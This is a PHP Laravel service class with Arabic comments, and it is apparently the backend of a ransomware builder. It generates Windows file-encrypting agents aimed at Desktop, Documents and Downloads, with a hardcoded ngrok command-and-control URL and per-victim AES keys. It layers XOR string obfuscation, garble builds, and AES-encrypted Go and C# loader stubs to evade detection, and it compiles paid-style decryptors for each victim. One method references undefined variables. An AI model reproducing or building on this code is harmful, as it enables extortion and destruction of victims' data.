<?php

namespace App\Services;

use App\Models\Payload;
use InvalidArgumentException;

class PayloadService
{
    // المفتاح السري لتشفير XOR (رقم بين 0 و 255)
    private int $xorKey = 0x5A; 

    // مسارات Go و Garble (تأكد من مطابقتها لجهازك)
    private string $goBinPath = '/usr/local/go/bin';
    private string $garblePath = '/home/u113/go/bin/garble';

    public function createPayloadProfile($profileId, $platform = 'windows', array $options = [])
    {
        if (is_object($profileId)) {
            $options['encryption_type'] = $options['encryption_type'] ?? $profileId->encryption_type ?? 'aes';
            $options['target_directories'] = $options['target_directories'] ?? $profileId->target_directories ?? 'Desktop';
            $profileId = $profileId->id;
        } elseif (is_array($profileId)) {
            $options['encryption_type'] = $options['encryption_type'] ?? $profileId['encryption_type'] ?? 'aes';
            $options['target_directories'] = $options['target_directories'] ?? $profileId['target_directories'] ?? 'Desktop';
            $profileId = $profileId['id'] ?? uniqid();
        }

        $algorithm = strtoupper($options['encryption_type'] ?? 'AES');
        if (! in_array($algorithm, ['AES', 'HYBRID'], true)) {
            throw new InvalidArgumentException('Unsupported encryption type.');
        }

        $targetDirs = $options['target_directories'] ?? 'Desktop';

        if (is_string($targetDirs) && str_starts_with(trim($targetDirs), '[')) {
            $decoded = json_decode($targetDirs, true);
            if (is_array($decoded) && count($decoded) > 0) {
                $targetDirs = $decoded;
            }
        }

        $tempDir = storage_path('app/temp/'.uniqid());
        if (! file_exists($tempDir)) {
            mkdir($tempDir, 0777, true);
        }

        $scriptPath = $tempDir.'/agent.go';
        $finalDir = storage_path('app/public/payloads');
        if (! file_exists($finalDir)) {
            mkdir($finalDir, 0777, true);
        }
        $finalPath = $finalDir.'/'.$profileId.'.exe';

        $code = $this->getClientCodeTemplate($targetDirs, $profileId);
        file_put_contents($scriptPath, $code);

        if ($platform === 'windows') {
            $logPath = storage_path('app/temp/build_error.log');

           $loaderBuildCmd = sprintf(
    'export PATH=%s:$PATH; GOOS=windows GOARCH=amd64 go build -o %s %s',
    escapeshellarg($this->goBinPath),
    escapeshellarg($finalLoaderPath),
    escapeshellarg($loaderScriptPath)
);

            exec($command);
        }

        return 'payloads/'.$profileId.'.exe';
    }

    public function createDecryptorPayload($victim)
    {
        $algorithm = strtoupper($victim->encryption_type ?? 'AES');
        if (! in_array($algorithm, ['AES', 'HYBRID'], true)) {
            return null;
        }

        $decryptKey = $victim->encryption_key;

        if (empty($decryptKey)) {
            return null;
        }

        $targetDirs = ['Desktop', 'Documents', 'Downloads'];

        $latestPayload = Payload::latest()->first();
        if ($latestPayload && ! empty($latestPayload->target_directories)) {
            $dirs = $latestPayload->target_directories;
            if (is_string($dirs) && str_starts_with(trim($dirs), '[')) {
                $decoded = json_decode($dirs, true);
                if (is_array($decoded)) {
                    $targetDirs = $decoded;
                }
            } elseif (is_array($dirs)) {
                $targetDirs = $dirs;
            }
        }

        $stubFile = resource_path('stubs/aes_decryptor.py');

        if (! file_exists($stubFile)) {
            return null;
        }

        $code = file_get_contents($stubFile);
        $dirsListPython = json_encode($targetDirs);

        $code = str_replace('__DECRYPT_KEY__', $decryptKey, $code);
        $code = str_replace('__PRIVATE_KEY__', $decryptKey, $code);
        $code = str_replace('__TARGET_DIRECTORIES__', $dirsListPython, $code);

        $tempDir = storage_path('app/temp/'.uniqid());
        if (! file_exists($tempDir)) {
            mkdir($tempDir, 0777, true);
        }

        $scriptPath = $tempDir.'/decryptor.py';
        $finalDir = storage_path('app/public/decryptors');
        if (! file_exists($finalDir)) {
            mkdir($finalDir, 0777, true);
        }

        $filename = 'decryptor_'.$victim->id.'.exe';
        $finalPath = $finalDir.'/'.$filename;

        file_put_contents($scriptPath, $code);

        $logPath = storage_path('app/temp/decrypt_build_error.log');
        $command = sprintf(
            'export WINEPREFIX="/home/u113/.wine"; wine python -m PyInstaller --onefile --distpath %s --name %s %s > %s 2>&1',
            escapeshellarg($finalDir),
            escapeshellarg('decryptor_'.$victim->id),
            escapeshellarg($scriptPath),
            escapeshellarg($logPath)
        );

        exec($command);

        return 'decryptors/'.$filename;
    }

    protected function getClientCodeTemplate($targetDirs, $profileId = null)
    {
        $c2ServerUrl = 'https://babble-flagman-divorcee.ngrok-free.dev/api/v1/report';
        $stubFile = resource_path('stubs/aes_agent.go');

        $code = file_get_contents($stubFile);

        if (is_array($targetDirs)) {
            $formattedDirs = implode(',', $targetDirs);
        } else {
            $formattedDirs = $targetDirs;
        }

        // توليد مفتاح AES للضحية
        $aesKey = bin2hex(random_bytes(16)); 

        // حفظ المفتاح في قاعدة البيانات (مهم جداً للـ Decryptor لاحقاً)
        if ($profileId) {
            Payload::updateOrCreate(
                ['id' => $profileId],
                ['encryption_key' => $aesKey, 'encryption_type' => 'AES']
            );
        }

        // تشفير النصوص (بما فيها مفتاح AES) باستخدام XOR
        $encC2Url = $this->xorEncrypt($c2ServerUrl, $this->xorKey);
        $encTargetDirs = $this->xorEncrypt($formattedDirs, $this->xorKey);
        $encAesKey = $this->xorEncrypt($aesKey, $this->xorKey);

        $code = str_replace('__C2_SERVER_URL__', $encC2Url, $code);
        $code = str_replace('__TARGET_DIRECTORIES__', $encTargetDirs, $code);
        $code = str_replace('__ENCRYPTED_AES_KEY__', $encAesKey, $code);
        $code = str_replace('__XOR_KEY__', '0x' . dechex($this->xorKey), $code);

        return $code;
    }

    public function generateDecryptor($payloadId)
    {
        $payload = Payload::findOrFail($payloadId);

        $targetDirs = $payload->target_directories;
        $algorithm = $payload->encryption_type;
        if (! in_array($algorithm, ['aes', 'hybrid'], true)) {
            throw new InvalidArgumentException('Unsupported encryption type.');
        }

        if (is_array($targetDirs)) {
            $formattedDirs = implode(',', $targetDirs);
        } else {
            $formattedDirs = $targetDirs;
        }

        $stubPath = resource_path("stubs/{$algorithm}_decryptor.go");
        if (! file_exists($stubPath)) {
            $stubPath = resource_path('stubs/aes_decryptor.go');
        }

        $code = file_get_contents($stubPath);

        $code = str_replace('__TARGET_DIRECTORIES__', $formattedDirs, $code);

        if ($algorithm === 'hybrid') {
            $code = str_replace('__PRIVATE_KEY__', $payload->private_key, $code);
        }

        $tempDir = storage_path('app/temp/'.uniqid());
        mkdir($tempDir, 0755, true);
        file_put_contents($tempDir.'/decryptor.go', $code);

        $outputPath = public_path('payloads/decryptor_'.$payload->id.'.exe');

        exec("cd {$tempDir} && GOOS=windows GOARCH=amd64 go build -o {$outputPath} decryptor.go");

        return $outputPath;
    }

    private function xorEncrypt(string $text, int $key): string
    {
        $encrypted = '';
        for ($i = 0; $i < strlen($text); $i++) {
            $encrypted .= chr(ord($text[$i]) ^ $key);
        }
        
        $hex = bin2hex($encrypted);
        
        $goBytes = '[]byte{';
        for ($i = 0; $i < strlen($hex); $i += 2) {
            $goBytes .= '0x' . substr($hex, $i, 2) . ', ';
        }
        $goBytes = rtrim($goBytes, ', ') . '}';
        
        return $goBytes;
    }

   public function buildLoaderPayload($profileId, $targetDirs)
{
    // معالجة إذا تم تمرير كائن Payload
    if (is_object($profileId)) {
        $targetDirs = $targetDirs ?? $profileId->target_directories;
        $profileId = $profileId->id;
    }

    // 1. بناء البايلود الأساسي أولاً
    $tempDir = storage_path('app/temp/'.uniqid());
    if (!file_exists($tempDir)) {
        mkdir($tempDir, 0777, true);
    }
    
    $originalScriptPath = $tempDir.'/agent.go';
    $originalExePath = $tempDir.'/agent.exe';
    
    // جلب كود البايلود الأساسي (مع تشفير XOR)
    $agentCode = $this->getClientCodeTemplate($targetDirs, $profileId);
    file_put_contents($originalScriptPath, $agentCode);
    
    // بناء البايلود الأساسي
    $buildCmd = sprintf(
        'export PATH=%s:$PATH; GOOS=windows GOARCH=amd64 %s -tiny -literals build -o %s %s',
        escapeshellarg($this->goBinPath),
        escapeshellarg($this->garblePath),
        escapeshellarg($originalExePath),
        escapeshellarg($originalScriptPath)
    );
    exec($buildCmd);

    // 2. التحقق من نجاح البناء
    if (!file_exists($originalExePath)) {
        throw new \Exception("Failed to build original payload. Check build logs.");
    }

    // 3. تشفير البايلود الناتج بـ AES
    $aesKey = random_bytes(32); // مفتاح 32 بايت لـ AES-256
    $payloadData = file_get_contents($originalExePath);
    
    $cipher = "aes-256-cbc";
    $ivLen = openssl_cipher_iv_length($cipher);
    $iv = openssl_random_pseudo_bytes($ivLen);
    $ciphertext = openssl_encrypt($payloadData, $cipher, $aesKey, OPENSSL_RAW_DATA, $iv);
    
    // دمج الـ IV مع النص المشفر
    $encryptedPayload = $iv . $ciphertext;

    // 4. تحويل البيانات المشفرة والمفتاح إلى صيغة Go Byte Slice
    $goEncryptedPayload = $this->toGoByteSlice($encryptedPayload);
    $goAesKey = $this->toGoByteSlice($aesKey);

    // 5. قراءة قالب الـ Loader وحقن البيانات
    $loaderStub = file_get_contents(resource_path('stubs/loader.go'));
    $loaderStub = str_replace('__ENCRYPTED_PAYLOAD__', $goEncryptedPayload, $loaderStub);
    $loaderStub = str_replace('__AES_KEY__', $goAesKey, $loaderStub);

    // 6. بناء الـ Go Loader
    $loaderScriptPath = $tempDir.'/loader.go';
    $finalLoaderDir = storage_path('app/public/payloads');
    if (!file_exists($finalLoaderDir)) {
        mkdir($finalLoaderDir, 0777, true);
    }
    $finalLoaderPath = $finalLoaderDir.'/loader_'.$profileId.'.exe';
    
    file_put_contents($loaderScriptPath, $loaderStub);
    
    $loaderBuildCmd = sprintf(
        'export PATH=%s:$PATH; GOOS=windows GOARCH=amd64 %s -tiny -literals build -o %s %s',
        escapeshellarg($this->goBinPath),
        escapeshellarg($this->garblePath),
        escapeshellarg($finalLoaderPath),
        escapeshellarg($loaderScriptPath)
    );
    exec($loaderBuildCmd);

    // 7. التحقق من نجاح بناء الـ Go Loader
    if (!file_exists($finalLoaderPath)) {
        throw new \Exception("Failed to build Go Loader. Check garble/go build logs.");
    }

    // 8. بناء C# Stub حول الـ Go Loader
    $finalStubPath = $this->buildCSharpStub($finalLoaderPath, $profileId);

    // 9. تنظيف الملفات المؤقتة
    @unlink($originalScriptPath);
    @unlink($originalExePath);
    @unlink($loaderScriptPath);
    @unlink($finalLoaderPath); // حذف الـ Go Loader بعد تضمينه في C#

    return $finalStubPath; // إرجاع مسار الـ Stub النهائي
}

    // دالة مساعدة لتحويل البيانات إلى صيغة Go
    private function toGoByteSlice($data): string
    {
        $hex = bin2hex($data);
        $goBytes = '[]byte{';
        for ($i = 0; $i < strlen($hex); $i += 2) {
            $goBytes .= '0x' . substr($hex, $i, 2) . ', ';
        }
        $goBytes = rtrim($goBytes, ', ') . '}';
        return $goBytes;
    }
        public function buildCSharpStub($goLoaderPath, $profileId)
    {
        // 1. قراءة ملف الـ Go Loader (الذي تم بناؤه مسبقاً)
        if (!file_exists($goLoaderPath)) {
            throw new \Exception("Go Loader not found.");
        }
        $goLoaderData = file_get_contents($goLoaderPath);

        // 2. تشفير الـ Go Loader بـ AES
        $cipher = "aes-256-cbc";
        $key = random_bytes(32);
        $iv = random_bytes(16);
        $encryptedData = openssl_encrypt($goLoaderData, $cipher, $key, OPENSSL_RAW_DATA, $iv);

        // 3. تحويل البيانات إلى صيغة C# (byte array)
        $csEncryptedData = $this->toCSharpByteArray($encryptedData);
        $csKey = $this->toCSharpByteArray($key);
        $csIv = $this->toCSharpByteArray($iv);

        // 4. قراءة قالب C# وحقن البيانات
        $stubFile = resource_path('stubs/csharp_loader.cs');
        $csCode = file_get_contents($stubFile);
        
        $csCode = str_replace('__ENCRYPTED_DATA__', $csEncryptedData, $csCode);
        $csCode = str_replace('__AES_KEY__', $csKey, $csCode);
        $csCode = str_replace('__AES_IV__', $csIv, $csCode);

        // 5. حفظ الكود وبناء الملف النهائي باستخدام Mono (mcs)
        $tempDir = storage_path('app/temp/'.uniqid());
        mkdir($tempDir, 0777, true);
        $csFilePath = $tempDir.'/loader.cs';
        file_put_contents($csFilePath, $csCode);

        $finalStubPath = storage_path('app/public/payloads/stub_'.$profileId.'.exe');
        
        // بناء ملف C# (ينتج exe يعمل على ويندوز)
        $buildCmd = sprintf(
            'mcs -out:%s %s',
            escapeshellarg($finalStubPath),
            escapeshellarg($csFilePath)
        );
        exec($buildCmd . ' 2>&1', $output, $returnCode);

        if ($returnCode !== 0) {
            throw new \Exception("C# build failed: " . implode("\n", $output));
        }

        // تنظيف
        @unlink($csFilePath);

        return 'payloads/stub_'.$profileId.'.exe';
    }

    // دالة مساعدة لتحويل البيانات إلى مصفوفة C#
    private function toCSharpByteArray($data): string
    {
        $bytes = array_map('ord', str_split($data));
        return implode(',', $bytes);
    }
}